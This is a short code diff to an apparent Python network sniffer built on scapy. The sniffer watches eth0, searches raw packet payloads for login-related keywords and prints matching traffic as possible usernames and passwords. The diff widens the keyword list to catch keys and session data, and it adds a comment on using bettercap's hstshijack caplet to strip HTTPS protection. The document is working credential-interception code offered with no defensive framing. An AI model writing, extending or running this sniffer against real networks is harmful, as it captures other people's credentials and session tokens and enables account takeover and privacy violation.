@@ -16,7 +16,7 @@ def get_login_info(packet):
             load = packet[scapy.Raw].load.decode("utf-8")
             if not load:
                 load = packet[scapy.Raw].load.decode()
-            keywords = ["username", "user", "login", "password", "pass", "name", "credential", "usr", "email"]
+            keywords = ["username", "user", "login", "password", "pass", "name", "usr", "email", "key", "session"]
             for keyword in keywords:
                 if keyword in load:
                     return load
@@ -34,3 +34,5 @@ def process_sniffed_packet(packet):
             print("\n\n[+] Possible username/password >> " + login_info + "\n\n")
 
 sniff("eth0")
+
+#to run https: bettercap -iface eth0 -caplet hstshijack/hstshijack
